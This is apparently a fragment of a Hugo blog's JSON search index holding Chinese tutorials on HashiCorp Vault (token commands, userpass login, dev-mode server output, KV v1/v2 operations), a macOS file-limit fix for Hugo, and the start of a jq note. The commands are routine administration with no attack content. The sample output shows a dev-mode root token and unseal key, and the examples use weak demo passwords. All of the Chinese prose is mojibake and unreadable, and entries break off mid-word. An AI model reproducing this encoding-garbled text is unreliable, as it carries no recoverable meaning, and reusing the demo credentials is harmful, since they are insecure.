çš„æœ‰æ•ˆæœŸã€‚åªæœ‰ root token æˆ–è€…æ‹¥æœ‰ç»­æœŸæƒé™çš„ token æ‰èƒ½ä½¿ç”¨è¯¥å‘½ä»¤ã€‚ vault token revoke: æ’¤é”€æŒ‡å®š tokenï¼Œä½¿å…¶å¤±æ•ˆã€‚åªæœ‰ root token æˆ–è€…æ‹¥æœ‰æ’¤é”€æƒé™çš„ token æ‰èƒ½ä½¿ç”¨è¯¥å‘½ä»¤ã€‚ vault token capabilities: æŸ¥çœ‹ token çš„æƒé™ã€‚ å‚æ•°æ–‡æ¡£https://developer.hashicorp.com/vault/docs/commands/token/create#command-options ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:3:1","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"userpassè®¤è¯ åˆ›å»ºç”¨æˆ·å’Œç»‘å®šç­–ç•¥ # æŸ¥çœ‹å½“å‰å¯åŠ¨çš„è®¤è¯åç«¯ vault auth list # å¯ç”¨userpassè®¤è¯åç«¯ vault auth enable userpass # åˆ›å»ºç”¨æˆ· vault write auth/userpass/users/user01 password=123 policies=app1-readonly # ä½¿ç”¨ç”¨æˆ·åå¯†ç ç™»å½• unset VAULT_TOKEN vault login -method=userpass username=user01 password=123 # ä¿®æ”¹ç­–ç•¥ vault write auth/userpass/users/user01 policies=test ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:3:2","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"åœ¨macä¸Šå¯åŠ¨hugo serveçš„æ—¶å€™é‡åˆ°äº†æŠ¥é”™ Watching for changes in /Users/SoulChild/Documents/xxx/{archetypes,assets,content,data,layouts,static,themes} Watching for config changes in /Users/SoulChild/Documents/xxx/config.toml, /Users/SoulChild/Documents/xxx/themes/FixIt/config.toml fatal error: pipe failed goroutine 1 [running]: runtime.throw({0x101d846b1?, 0xc004ef2870?}) ... è§£å†³æ–¹æ³•å¦‚ä¸‹ sudo launchctl limit maxfiles 65535 200000 ulimit -n 65535 sudo sysctl -w kern.maxfiles=100000 sudo sysctl -w kern.maxfilesperproc=65535 ","date":"2023-02-16 00:32","objectID":"/post/hugo%E6%8A%A5%E9%94%99pipe-failed/:0:0","tags":["hugo"],"title":"HugoæŠ¥é”™pipe Failed","uri":"/post/hugo%E6%8A%A5%E9%94%99pipe-failed/"},{"categories":["å…¶ä»–"],"content":"åŸºæœ¬æ¦‚å¿µ Vaultçš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå®ƒè´Ÿè´£å­˜å‚¨å’ŒåŠ å¯†æ•°æ®ï¼Œä»¥åŠå¤„ç†ç”¨æˆ·çš„è¯·æ±‚ã€‚å¯ä»¥å•æœºæ¨¡å¼æˆ–é›†ç¾¤æ¨¡å¼è¿è¡Œ Vaultçš„æ•°æ®æ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªæŒä¹…åŒ–çš„åç«¯ä¸­ï¼Œå®ƒå¯ä»¥æ˜¯æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€æ•°æ®åº“ã€äº‘å­˜å‚¨ç­‰ã€‚ Vaultçš„ç”¨æˆ·å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œã€apiã€æˆ–web ui æ¥ä¸Vaultäº¤äº’ã€‚ Vaultçš„æ•°æ®æ˜¯ä»¥å¯†æ–‡çš„å½¢å¼å­˜å‚¨åœ¨åç«¯ä¸­ï¼Œéœ€è¦å¯†é’¥æ‰èƒ½è§£å¯†ã€‚ä½†æ˜¯å¯†é’¥æœ¬èº«åˆè¢«ä¸€ä¸ªä¸»å¯†é’¥ï¼ˆmaster keyï¼‰åŠ å¯†ï¼Œç§°ä¸ºå¯†å°ï¼ˆsealï¼‰æœºåˆ¶ï¼Œè§£å¯†å¯†é’¥çš„è¿‡ç¨‹ç§°ä¸ºè§£å°ï¼ˆunsealï¼‰ã€‚Vaultæ”¯æŒè‡ªåŠ¨è§£å°ï¼ˆauto-unsealï¼‰å’Œæ‰‹åŠ¨è§£å°ï¼ˆShamirâ€™s Secret Sharingï¼‰ã€‚åœ¨Vaultå¯åŠ¨åï¼Œéœ€è¦å…ˆæ‰§è¡Œè§£å°æ“ä½œï¼Œæ‰èƒ½è¿›è¡Œåç»­çš„ä½¿ç”¨ã€‚ Vaultçš„æ•°æ®å¯ä»¥åˆ†ä¸ºé™æ€çš„ï¼ˆStaticï¼‰æˆ–åŠ¨æ€çš„ï¼ˆDynamicï¼‰ã€‚é™æ€çš„æ•°æ®æ˜¯ç”±ç”¨æˆ·æä¾›çš„ï¼Œæ¯”å¦‚å¯†ç ã€è¯ä¹¦ç­‰ã€‚åŠ¨æ€çš„æ•°æ®æ˜¯ç”±Vaultæ ¹æ®ç”¨æˆ·çš„è¯·æ±‚å’Œé…ç½®æ¥ç”Ÿæˆçš„ï¼Œæ¯”å¦‚æ•°æ®åº“å‡­è¯ã€äº‘è®¿é—®ä»¤ç‰Œç­‰ã€‚åŠ¨æ€çš„æ•°æ®é€šå¸¸æœ‰ä¸€ä¸ªæœ‰æ•ˆæœŸï¼ˆTTLï¼‰ï¼Œè¿‡æœŸåä¼šè¢«Vaultè‡ªåŠ¨æ”¶å›ï¼ˆRevokeï¼‰ã€‚ Vaultçš„æ•°æ®æ˜¯é€šè¿‡ä¸åŒçš„æœºå¯†å¼•æ“ï¼ˆSecrets Engineï¼‰æ¥å­˜å‚¨å’Œè®¿é—®çš„ï¼Œå®ƒä»¬å¯ä»¥æ˜¯é€šç”¨çš„ï¼ˆKVï¼‰æˆ–ä¸“ç”¨çš„ï¼ˆAWS, MySQL, PKIç­‰ï¼‰ã€‚å…¶ä»–å­˜å‚¨å¼•æ“ Vaultçš„ç”¨æˆ·éœ€è¦é€šè¿‡èº«ä»½éªŒè¯ï¼ˆAuthï¼‰æ¥è·å–è®¿é—®Vaultçš„å‡­è¯ï¼ˆTokenï¼‰ï¼Œä»¥åŠé€šè¿‡æˆæƒï¼ˆPolicyï¼‰æ¥è·å–è®¿é—®Vaultçš„æƒé™ï¼ˆCapabilityï¼‰ã€‚èº«ä»½éªŒè¯å¯ä»¥æ˜¯æœ¬åœ°çš„ï¼ˆToken, Userpassï¼‰æˆ–å¤–éƒ¨çš„ï¼ˆLDAP, Okta, Kubernetesç­‰ï¼‰ ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:1:0","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"ä¸€ã€å®‰è£… sudo yum install -y yum-utils sudo yum-config-manager --add-repo https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo sudo yum -y install vault ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:2:0","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"äºŒã€å¼€å‘æ¨¡å¼å¯åŠ¨Server ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:3:0","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"å¯åŠ¨ åœ¨å¼€å‘æ¨¡å¼ä¸‹ï¼ŒVaultåœ¨å†…å­˜ä¸­è¿è¡Œå¹¶å¯åŠ¨ã€‚ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œdevæ¨¡å¼ [root@mytest ~]# vault server -dev ==\u003e Vault server configuration: Api Address: http://127.0.0.1:8200 Cgo: disabled Cluster Address: https://127.0.0.1:8201 Environment Variables: GODEBUG, HISTCONTROL, HISTSIZE, HOME, HOSTNAME, LANG, LESSOPEN, LOGNAME, LS_COLORS, MAIL, PATH, PWD, SHELL, SHLVL, SSH_CLIENT, SSH_CONNECTION, SSH_TTY, TERM, USER, XDG_DATA_DIRS, XDG_RUNTIME_DIR, XDG_SESSION_ID, _ Go Version: go1.19.4 Listener 1: tcp (addr: \"127.0.0.1:8200\", cluster address: \"127.0.0.1:8201\", max_request_duration: \"1m30s\", max_request_size: \"33554432\", tls: \"disabled\") Log Level: info Mlock: supported: true, enabled: false Recovery Mode: false Storage: inmem Version: Vault v1.12.3, built 2023-02-02T09:07:27Z Version Sha: 209b3dd99fe8ca320340d08c70cff5f620261f9b ==\u003e Vault server started! Log data will stream in below: # ...snip... WARNING! dev mode is enabled! In this mode, Vault runs entirely in-memory and starts unsealed with a single unseal key. The root token is already authenticated to the CLI, so you can immediately begin using Vault. You may need to set the following environment variables: $ export VAULT_ADDR='http://127.0.0.1:8200' The unseal key and root token are displayed below in case you want to seal/unseal the Vault or re-authenticate. Unseal Key: 8Ewx5xPvtY4cVrVOteAvp6ktfDVocHN6+yPAEXy1XFE= Root Token: hvs.6oYAvQH1OczlvBwfjund3teu Development mode should NOT be used in production installations! ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:3:1","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"è®¾ç½®ç¯å¢ƒå˜é‡ export VAULT_ADDR='http://127.0.0.1:8200' export VAULT_TOKEN=\"hvs.6oYAvQH1OczlvBwfjund3teu\" Unseal Key: è§£å°å¯†é’¥,ç”Ÿäº§æ¨¡å¼ä¸‹å¾ˆé‡è¦,å¼€å‘æ¨¡å¼æš‚æ—¶ç”¨ä¸åˆ° Root Token: ç™»å½•token vault login \u003ctoken_value\u003e ä¹Ÿå¯ä»¥è¿›è¡Œç™»å½• ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:3:2","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"æŸ¥è¯¢è¿è¡ŒçŠ¶æ€ [root@mytest ~]# vault status Key Value --- ----- Seal Type shamir # å¯†å°ç±»å‹ï¼ŒæŒ‡å®š Vault çš„å¯†å°æœºåˆ¶ï¼Œä¾‹å¦‚ä½¿ç”¨ shamirã€awskmsã€transit ç­‰ Initialized true # æ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼ŒæŒ‡ç¤º Vault æ˜¯å¦å·²ç»åˆå§‹åŒ–å¹¶é…ç½®å¥½å­˜å‚¨ç­‰å‚æ•°ã€‚ Sealed false # å¯†å°çŠ¶æ€ï¼Œfalse=å·²è§£å° Total Shares 1 # ç”¨äºè§£å°å¯†é’¥çš„åˆ†ç‰‡æ•°é‡ Threshold 1 # ä½¿ç”¨å¤šå°‘ä¸ªå¯†é’¥å¯ä»¥è§£å° Version 1.12.3 Build Date 2023-02-02T09:07:27Z Storage Type inmem # åç«¯å­˜å‚¨ä¸ºå†…å­˜ Cluster Name vault-cluster-da3febf4 Cluster ID 6c5611e2-2f6b-995e-f81d-fd5c60ba274c HA Enabled false ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:3:3","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"ä¸‰ã€åŸºæœ¬ç”¨æ³• KVå­˜å‚¨å¼•æ“æ˜¯ä¸€ç§é€šç”¨çš„é™æ€å¯†ç ç®¡ç†å¼•æ“ï¼Œå®ƒå¯ä»¥è®©ç”¨æˆ·è½»æ¾åœ°å­˜å‚¨å’Œè®¿é—®æ•æ„Ÿæ•°æ®ï¼Œå¦‚API Secretã€è¯ä¹¦ã€å¯†ç ç­‰ã€‚KVå¼•æ“ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶æœºåˆ¶ï¼Œå¯ä»¥è®°å½•å’Œè·Ÿè¸ªå†å²ä¸Šæ¯ä¸ªå¯†ç çš„å˜æ›´å’Œç‰ˆæœ¬ï¼ŒåŒæ—¶è¿˜æ”¯æŒå„ç§æ•°æ®æ ¼å¼å’Œå¤šç§è®¿é—®æ§åˆ¶ç­–ç•¥ã€‚ kvå­˜å‚¨å¼•æ“åˆ†ä¸ºv1å’Œv2ä¸¤ä¸ªç‰ˆæœ¬ï¼Œå¼€å‘æ¨¡å¼ä¸‹é»˜è®¤æ˜¯v2ç‰ˆæœ¬ ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:4:0","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"KV Version 1 Vaultæ—©æœŸç‰ˆæœ¬ä¸­é»˜è®¤çš„Key-Value Secrets Engineã€‚å®ƒä¸æ”¯æŒæ•°æ®ç‰ˆæœ¬ç®¡ç†ï¼Œå¹¶ä¸”æ— æ³•åœ¨ç°æœ‰æ•°æ®ä¸Šæ‰§è¡ŒCASæ“ä½œã€‚å› æ­¤ï¼Œå¯¹äºéœ€è¦ç‰ˆæœ¬ç®¡ç†æˆ–æ›´é«˜çº§åˆ«çš„æ•°æ®è®¿é—®æ§åˆ¶çš„åœºæ™¯ï¼ŒKV Version 1å¯èƒ½ä¸æ˜¯æœ€ä½³é€‰æ‹©ã€‚ä½†æ˜¯ï¼Œå¯¹äºç®€å•çš„æ•°æ®å­˜å‚¨å’Œæ£€ç´¢éœ€æ±‚ï¼ŒKV Version 1ä»ç„¶æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ CASæ“ä½œç”¨äºé˜²æ­¢å¤šä¸ªç”¨æˆ·åŒæ—¶ä¿®æ”¹æ•°æ®æ—¶,æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚å‡è®¾ä½ æƒ³è¦ä¿®æ”¹ä¸€ä¸ªåä¸ºcredsçš„secret keyï¼Œå®ƒçš„å½“å‰ç‰ˆæœ¬æ˜¯2ã€‚ä½ å¯ä»¥ä½¿ç”¨-cas=2æ¥æŒ‡å®šä½ æœŸæœ›çš„ç‰ˆæœ¬å· å¦‚æœæœ€æ–°çš„secret keyçš„ç‰ˆæœ¬æ˜¯2ï¼Œå†™å…¥æ“ä½œå°±ä¼šæˆåŠŸï¼Œsecret keyçš„ç‰ˆæœ¬å°±ä¼šå˜æˆ3ã€‚ä½†æ˜¯ï¼Œå¦‚æœsecret keyçš„ç‰ˆæœ¬å·²ç»è¢«åˆ«äººæ”¹æˆäº†3æˆ–è€…æ›´é«˜ï¼Œå†™å…¥æ“ä½œå°±ä¼šå¤±è´¥ï¼Œä½ å°±ä¼šæ”¶åˆ°ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œå‘Šè¯‰ä½ å¯†é’¥çš„ç‰ˆæœ¬ä¸åŒ¹é…ã€‚ å¯ç”¨åŠŸèƒ½: delete get list put å®ä¾‹åŒ–v1ç‰ˆæœ¬ # å¯ç”¨å¹¶æŒ‚è½½åˆ°kv1è·¯å¾„ vault secrets enable -version=1 -description=\"KV Version 1\" -path=\"kv1\" kv # æŸ¥çœ‹ vault secrets list # æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ vault secrets list --format=json | jq '.[\"kv1/\"]' # ç¦ç”¨å¼•æ“,ä¼šåˆ é™¤è¿™ä¸ªå¼•æ“è·¯å¾„ä¸‹çš„æ‰€æœ‰æ•°æ®,æ…é‡ï¼ï¼ï¼ vault secrets disable \"kv1/\" kv1/æ›´åƒæ˜¯ç”±kvå¼•æ“å®ä¾‹åŒ–å‡ºæ¥çš„å®ä¾‹,ä»–ä¸ä»£è¡¨å¼•æ“æœ¬èº«ã€‚ å¢åˆ æŸ¥ # å†™å…¥,å¯ä»¥ä½¿ç”¨ttl=30å‚æ•°è¡¨ç¤ºè¿‡æœŸæ—¶é—´,ä½†vaultä¸ä¼šè‡ªè¡Œåˆ é™¤æ•°æ®,åªèƒ½èµ·åˆ°æç¤ºä½œç”¨ # æ³¨æ„putæ˜¯è¦†ç›–,ä¸æ˜¯è¿½åŠ å’Œä¿®æ”¹ vault kv put kv1/myapp/config username=admin password=secretpassword # åˆ—è¡¨ vault kv list kv1/ # è¯»å– vault kv get kv1/myapp/config vault kv get -format=json kv1/myapp/config vault kv get -format=json -field=data kv1/myapp/config # åˆ é™¤ vault kv delete kv1/myapp/config ","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:4:1","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"KV Version 2 KV Version 2æ˜¯Vault 0.10ç‰ˆæœ¬ä¸­å¼•å…¥çš„æ–°ç‰ˆæœ¬Key-Value Secrets Engineã€‚ç›¸æ¯”äºKV Version 1, å®ƒæ”¯æŒå¤šä¸ªç‰ˆæœ¬çš„æ•°æ®, å…è®¸CASæ“ä½œ, å¯ä»¥è®¾ç½®å­˜å‚¨é™åˆ¶å’Œæ•°æ®è¿‡æœŸæ—¶é—´, å¹¶ä¸”æ”¯æŒå¤æ‚çš„è®¿é—®ç­–ç•¥ã€‚æ­¤å¤–ï¼ŒKV Version 2è¿˜æ”¯æŒå°†æ•°æ®ç‰ˆæœ¬å­˜å‚¨åœ¨å¤šä¸ªç‰ˆæœ¬å­˜å‚¨åç«¯ï¼ˆVersioned Backendï¼‰ä¸­ï¼Œä»¥æé«˜æ•°æ®çš„å¯ç”¨æ€§å’Œå¯é æ€§ã€‚ CASæ“ä½œç”¨äºé˜²æ­¢å¤šä¸ªç”¨æˆ·åŒæ—¶ä¿®æ”¹æ•°æ®æ—¶,æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚å‡è®¾ä½ æƒ³è¦ä¿®æ”¹ä¸€ä¸ªåä¸ºcredsçš„secret keyï¼Œå®ƒçš„å½“å‰ç‰ˆæœ¬æ˜¯2ã€‚ä½ å¯ä»¥ä½¿ç”¨-cas=2æ¥æŒ‡å®šä½ æœŸæœ›çš„ç‰ˆæœ¬å· å¦‚æœæœ€æ–°çš„secret keyçš„ç‰ˆæœ¬æ˜¯2ï¼Œå†™å…¥æ“ä½œå°±ä¼šæˆåŠŸï¼Œsecret keyçš„ç‰ˆæœ¬å°±ä¼šå˜æˆ3ã€‚ä½†æ˜¯ï¼Œå¦‚æœsecret keyçš„ç‰ˆæœ¬å·²ç»è¢«åˆ«äººæ”¹æˆäº†3æˆ–è€…æ›´é«˜ï¼Œå†™å…¥æ“ä½œå°±ä¼šå¤±è´¥ï¼Œä½ å°±ä¼šæ”¶åˆ°ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œå‘Šè¯‰ä½ secret keyçš„ç‰ˆæœ¬ä¸åŒ¹é…ã€‚ å¯ç”¨åŠŸèƒ½: delete destroy enable-versioning get list metadata patch put rollback undelete å®ä¾‹åŒ–v2ç‰ˆæœ¬ # å¯ç”¨å¹¶æŒ‚è½½åˆ°kv2è·¯å¾„ vault secrets enable -version=2 -description=\"KV Version 2\" -path=\"kv2\" kv # æˆ–è€…vault secrets enable -description=\"KV Version 2\" -path=\"kv2\" kv-v2 # æŸ¥çœ‹ vault secrets list # æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ vault secrets list --format=json | jq '.[\"kv2/\"]' # ç¦ç”¨å¼•æ“,ä¼šåˆ é™¤è¿™ä¸ªå¼•æ“è·¯å¾„ä¸‹çš„æ‰€æœ‰æ•°æ®,æ…é‡ï¼ï¼ï¼ vault secrets disable \"kv2\" kv2/æ›´åƒæ˜¯ç”±kvå¼•æ“å®ä¾‹åŒ–å‡ºæ¥çš„å®ä¾‹,ä»–ä¸ä»£è¡¨å¼•æ“æœ¬èº«ã€‚ v1å‡çº§åˆ°v2 - enable-versioning vaultæ”¯æŒå°†v1å‡çº§åˆ°v2,å¦‚æœæœ‰éœ€æ±‚å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼ vault kv enable-versioning kv1 æ³¨æ„: å¦‚æœä½ çš„v1é…ç½®äº†è®¿é—®æ§åˆ¶åˆ—è¡¨(ACL Rules),è¿˜éœ€è¦ä¿®æ”¹ä»–çš„api path, v1å’Œv2ä½¿ç”¨äº†ä¸åŒçš„apiè·¯å¾„ https://developer.hashicorp.com/vault/docs/secrets/kv/kv-v2#acl-rules å†™å…¥ - put # å†™å…¥,å®˜æ–¹å»ºè®®ç¬¬ä¸€ç§, ä½¿ç”¨-mountæŒ‡å®šæ ¹è·¯å¾„ vault kv put -mount=kv2 myapp/config username=admin password=secretpassword or # æˆ‘æ›´å–œæ¬¢ç¬¬äºŒç§,ä¸è¿‡éœ€è¦æ³¨æ„kv2/myapp/configå¯¹åº”çš„apiè·¯å¾„ä¸ºkv2/data/myapp/config vault kv put kv2/myapp/config username=admin password=secretpassword # casæ“ä½œ # æˆ‘ä»¬æœŸæœ›å†™å…¥ç‰ˆæœ¬ä¸º1çš„secret, å¦‚æœæœ€æ–°ç‰ˆæœ¬ä¸æ˜¯1ï¼Œé‚£ä¹ˆå°±ä¸ä¼šä¿®æ”¹æˆåŠŸã€‚ vault kv put -cas=1 kv2/myapp/config foo=aa bar=bb # -cas=0åªæœ‰secretä¸å­˜åœ¨æ—¶æ‰ä¼šå†™å…¥ï¼Œå¯ä»¥é˜²æ­¢è¦†ç›–å·²å­˜åœ¨çš„secret åˆ—è¡¨ - list vault kv list kv2/ è¯»å– - get vault kv get kv2/myapp/config vault kv get -format=json kv2/myapp/config vault kv get -format=json -field=data kv2/myapp/config # è·å–æŒ‡å®šçš„å±æ€§ vault kv get -field=foo kv2/myapp/config ## aa # æŸ¥çœ‹æŒ‡å®šçš„ç‰ˆæœ¬ vault kv get -version=1 kv2/myapp/config è¡¥ä¸ - patch é€šè¿‡patchå¯ä»¥å®Œæˆéƒ¨åˆ†ä¿®æ”¹ vault kv patch -cas=2 kv2/myapp/config bar=bbb # -method=rw ä»£è¡¨å…ˆè¯»å–æœ€æ–°ç‰ˆçš„å†…å®¹ï¼Œç„¶ååœ¨æœ¬åœ°æ‰§è¡Œåˆå¹¶ï¼Œæœ€åæ‰§è¡Œè¦†å†™ã€‚è¿™ç§æ–¹æ³•ä¸æ”¯æŒ-cas,å› ä¸ºä»–ä¼šä»æœåŠ¡å™¨è¯»å–æœ€æ–°çš„ç‰ˆæœ¬å· vault kv patch -method=rw kv2/myapp/config bar=bbbb è½¯åˆ é™¤ - delete åˆ é™¤æŸä¸ªç‰ˆæœ¬çš„æ•°æ®,å¯ä»¥æ¢å¤ã€‚è¿™é‡Œåªæ˜¯è½¯åˆ é™¤æŸä¸ªç‰ˆæœ¬,å¦‚æœè¦å½»åº•åˆ é™¤secret key, éœ€è¦ä½¿ç”¨vault kv metadata delete # åˆ é™¤æœ€æ–°ç‰ˆæœ¬, ç‰ˆæœ¬å·ä¾ç„¶æ˜¯å­˜åœ¨çš„,åªä¸è¿‡secretæ•°æ®çœ‹ä¸åˆ°äº† # åé¢å†åˆ›å»ºçš„è¯ç‰ˆæœ¬å·è¿˜æ˜¯ä¼šé€’å¢çš„, ä¸ä¼šä½¿ç”¨è¿™ä¸ªè¢«åˆ é™¤çš„ vault kv delete kv2/myapp/config # åˆ é™¤å¤šä¸ªæŒ‡å®šç‰ˆæœ¬ vault kv delete -versions=1,2 kv2/myapp/config vault kv get kv2/myapp/config ==== Secret Path ==== kv2/data/myapp/config ======= Metadata ======= Key Value --- ----- created_time 2023-02-15T14:30:24.221500782Z custom_metadata \u003cnil\u003e deletion_time 2023-02-15T14:55:18.541629579Z destroyed false version 8 å–æ¶ˆåˆ é™¤ - undelete # æ¢å¤è½¯åˆ é™¤çš„ç‰ˆæœ¬ vault kv undelete -versions 8 kv2/myapp/config é”€æ¯æ•°æ® - destroy é”€æ¯æŸä¸ªç‰ˆæœ¬çš„æ•°æ®,æ— æ³•æ¢å¤ã€‚è¿™é‡Œåªæ˜¯é”€æ¯æŸä¸ªç‰ˆæœ¬, å¦‚æœè¦å½»åº•åˆ é™¤secret key, éœ€è¦ä½¿ç”¨vault kv metadata delete. # åˆ é™¤æœ€æ–°ç‰ˆæœ¬, ç‰ˆæœ¬å·ä¾ç„¶æ˜¯å­˜åœ¨çš„, åªä¸è¿‡secretæ•°æ®çœ‹ä¸åˆ°äº†, å¹¶ä¸”destroyedçš„çŠ¶æ€ä¸ºtrue # åé¢å†åˆ›å»ºçš„è¯ç‰ˆæœ¬å·è¿˜æ˜¯ä¼šé€’å¢çš„, ä¸ä¼šä½¿ç”¨è¿™ä¸ªè¢«åˆ é™¤çš„ vault kv destroy -versions=8 kv2/myapp/config # åˆ é™¤å¤šä¸ªæŒ‡å®šç‰ˆæœ¬ vault kv destroy -versions=3,4 kv2/myapp/config å›æ»š - rollback # å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬,è¿™å°†ä¼šåˆ›å»ºä¸€ä¸ªæ–°ç‰ˆæœ¬,ä»–çš„å†…å®¹å’ŒæŒ‡å®šçš„ç‰ˆæœ¬ä¸€è‡´ vault kv rollback -version 7 kv2/myapp/config å…ƒæ•°æ® - metadata æ¯ä¸ªsecret keyéƒ½æ‹¥æœ‰ä¸€ä¸ªå¯¹åº”çš„metadata, ç”¨æ¥è®¾ç½®è¿™ä¸ªsecret keyçš„å±æ€§(æœ€å¤§versionã€å¿…é¡»ä½¿ç”¨casç­‰) æŸ¥çœ‹ - get æŸ¥çœ‹æŸä¸ªsecret keyçš„metadataçš„ä¿¡æ¯ï¼Œè¿™åŒ…å«äº†ä»–æ‰€æœ‰çš„ç‰ˆæœ¬ä¿¡æ¯å’Œå…ƒæ•°æ® [root@mytest ~]# vault kv metadata get kv2/myapp/config ===== Metadata Path ===== kv2/metadata/myapp/config ========== Metadata ========== Key Value --- ----- cas_required false created_time 2023-02-15T13:55:14.471446254Z current_version 9 custom_metadata \u003cnil\u003e delete_version_after 0s max_versions 0 oldest_version 0 updated_time 2023-02-15T15:05:28.648657534Z ====== Version 1 ====== # ...snip... è®¾ç½®å±æ€§ # è®¾ç½®secret keyæœ€å¤§å†å²ç‰ˆæœ¬æ•° # ä¿®æ”¹å®Œåè¿˜å¯ä»¥æŸ¥è¯¢,å¦‚æœé‡æ–°putæ•°æ®å, å†æŸ¥æœ€è¿‘2ä¸ªä¹‹å¤–çš„å†å²ç‰ˆæœ¬ä¼šæç¤º No value found at kv2/data/myapp/config [root@mytest ~]# vault kv metadata put -max-versions 2 kv2/myapp/config # åˆ é™¤æŒ‡å®šæ—¶é—´ä¹‹å‰çš„ç‰ˆæœ¬, ä¹Ÿå¯ä»¥ç»“åˆä¸Šé¢çš„å‘½ä»¤ä¸€èµ·ä½¿ç”¨ [root@mytest ~]# vault kv metadata put -delete-version-after=\"3h25m19s\" kv2/myapp/config # å…¶ä»–çš„ä¸€äº›å±æ€§ # -cas-required=true å†™å…¥secret keyæ—¶å¿…é¡»æŒ‡å®š-caså‚æ•° # -custom-metadata=\"creator=soulchild\" è®¾ç½®ä¸€äº›è‡ªå®šä¹‰çš„å…ƒæ•°æ®ä¿¡æ¯ # åˆ›å»ºmetadata, putä¹Ÿå¯ä»¥ç”¨æ¥ä¿®æ”¹å±æ€§ [root@mytest ~]# vault kv metadata put -custom-metadata=owner=soulchild -custom-metadata=biz=arch kv2/myapp/config # åˆ é™¤æ•´ä¸ªsecret key vault kv met","date":"2023-02-14 22:26","objectID":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/:4:2","tags":["vault"],"title":"Vaultå…¥é—¨(ä¸€)","uri":"/post/vault%E5%85%A5%E9%97%A8%E4%B8%80/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"jqå‘½ä»¤ä¸€èˆ¬ç”¨æ¥è¯»å–jsonæ•°æ®,æ—¥å¸¸ç”¨æ³•æ¯”è¾ƒç®€å•,æœ‰æ—¶å€™ä¼šæœ‰äº›ç‰¹æ®Šéœ€æ±‚,æ¯æ¬¡éƒ½æ˜¯ç”¨çš„æ—¶å€™æŸ¥æ–‡æ¡£,è¿‡ä¸€æ®µæ—¶é—´å†ç”¨åˆå¿˜äº†,æ•ˆç‡å¤ªä½,å†³å®šå†™ä¸ªæ–‡ç« è®°å½•ä¸‹æ¥,æ–¹ä¾¿ä»¥åè‡ªæŸ¥ã€‚ å®˜æ–¹æ–‡æ¡£: https://stedolan.github.io/jq/manual/v1.6/#Basicfilters åœ¨çº¿æµ‹è¯•å·¥å…·: https://sandbox.bio/playgrounds?id=jq https://jqkungfu.com/ https://jiehong.gitlab.io/jq_offline/ https://jqplay.org/ ","date":"2023-02-13 